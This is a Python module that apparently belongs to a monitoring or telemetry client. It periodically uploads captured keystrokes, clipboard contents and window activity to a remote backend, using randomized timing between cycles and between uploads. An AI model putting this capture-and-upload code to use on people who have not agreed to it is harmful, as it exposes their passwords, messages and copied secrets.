"""
Staggered synchronization engine.
Extracts data from collectors, formats it, and uploads it securely to the Vercel backend using jittered delays.
"""
import threading
import time
import random
import httpx
from datetime import datetime, timezone
from typing import Optional

from .config import settings
from .http_client import get_http_client
from .collectors.window_collector import WindowCollector
from .collectors.clipboard_collector import ClipboardCollector
from .collectors.keystroke_collector import KeystrokeCollector

UPLOAD_STAGGER_MIN_SECONDS = 0.25
UPLOAD_STAGGER_MAX_SECONDS = 0.5


class SyncEngine:
    """
    Manages the background loop that flushes all collectors and staggers uploads to the server.
    """

    def __init__(
        self,
        session_id: str,
        window_collector: WindowCollector,
        clipboard_collector: ClipboardCollector,
        keystroke_collector: KeystrokeCollector
    ) -> None:
        self.session_id = session_id
        self._window_collector = window_collector
        self._clipboard_collector = clipboard_collector
        self._keystroke_collector = keystroke_collector

        self._sync_number: int = 0
        self._offline_periods: list[dict] = []
        self._disconnected_at: Optional[str] = None

        self._stop_event = threading.Event()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._sync_lock = threading.Lock()

    def start(self) -> None:
        """Starts the background staggered sync loop."""
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Signals the background sync loop to stop and exit cleanly."""
        self._stop_event.set()

    def flush_final(self) -> None:
        """Push any remaining buffered telemetry without extra shutdown delays."""
        self._sync(delay_between_uploads=False)

    def _loop(self) -> None:
        """Continuously runs the sync cycle, separated by a randomized 55-65s jitter."""
        while not self._stop_event.is_set():
            jitter = random.uniform(55, 65)
            if self._stop_event.wait(jitter):
                break
            self._sync()

    def _sync(self, delay_between_uploads: bool = True) -> None:
        """Executes a single staggered sync cycle across all collector endpoints."""
        with self._sync_lock:
            self._sync_number += 1
            synced_at = datetime.now(timezone.utc).isoformat()

            keystrokes = self._keystroke_collector.peek(limit=500)
            windows = self._window_collector.peek(limit=500)
            clipboard = self._clipboard_collector.peek(limit=500)

            headers = {
                "X-API-Key": settings.BACKEND_API_KEY,
                "Content-Type": "application/json"
            }

            client = get_http_client()
            telemetry_sync_id = self._initialize_sync(headers, client, synced_at)
            success_k = self._upload_endpoint("/sync/keystrokes", "keystrokes", keystrokes, synced_at, headers, client, telemetry_sync_id)
            if success_k:
                self._keystroke_collector.pop(len(keystrokes))
            if delay_between_uploads:
                time.sleep(random.uniform(UPLOAD_STAGGER_MIN_SECONDS, UPLOAD_STAGGER_MAX_SECONDS))

            success_w = self._upload_endpoint("/sync/windows", "windows", windows, synced_at, headers, client, telemetry_sync_id)
            if success_w:
                self._window_collector.pop(len(windows))
            if delay_between_uploads:
                time.sleep(random.uniform(UPLOAD_STAGGER_MIN_SECONDS, UPLOAD_STAGGER_MAX_SECONDS))

            success_c = self._upload_endpoint("/sync/clipboard", "clipboard", clipboard, synced_at, headers, client, telemetry_sync_id)
            if success_c:
                self._clipboard_collector.pop(len(clipboard))
            if delay_between_uploads:
                time.sleep(random.uniform(UPLOAD_STAGGER_MIN_SECONDS, UPLOAD_STAGGER_MAX_SECONDS))

            success_o = self._upload_endpoint("/sync/offline", "offline_periods", self._offline_periods, synced_at, headers, client, telemetry_sync_id)

            if success_o:
                self._offline_periods = []

            all_succeeded = success_k and success_w and success_c and success_o

            if all_succeeded:
                if self._disconnected_at is not None:
                    self._offline_periods.append({
                        "disconnected_at": self._disconnected_at,
                        "reconnected_at": synced_at
                    })
                    self._disconnected_at = None
            else:
                if self._disconnected_at is None:
                    self._disconnected_at = synced_at

    def _initialize_sync(self, headers: dict, client: httpx.Client, synced_at: str) -> str | None:
        url = f"{settings.BACKEND_URL.rstrip('/')}/sync/init"
        payload = {
            "session_id": self.session_id,
            "sync_number": self._sync_number,
            "synced_at": synced_at,
        }

        try:
            response = client.post(url, headers=headers, json=payload, timeout=15.0)
            response.raise_for_status()
            data = response.json()
            return data.get("telemetry_sync_id")
        except Exception as e:
            print(f"[SYNC] Warning: /sync/init failed - {str(e)}")
            return None

    def _upload_endpoint(self, route: str, payload_key: str, data_list: list, synced_at: str, headers: dict, client: httpx.Client, telemetry_sync_id: str | None) -> bool:
        """Helper to POST specific datasets synchronously with error handling."""
        url = f"{settings.BACKEND_URL.rstrip('/')}{route}"
        payload = {
            "session_id": self.session_id,
            "sync_number": self._sync_number,
            "synced_at": synced_at,
            "telemetry_sync_id": telemetry_sync_id,
            payload_key: data_list
        }

        try:
            response = client.post(url, headers=headers, json=payload, timeout=15.0)
            response.raise_for_status()
            return True
        except Exception as e:
            print(f"[SYNC] Warning: {route} upload failed - {str(e)}")
            return False
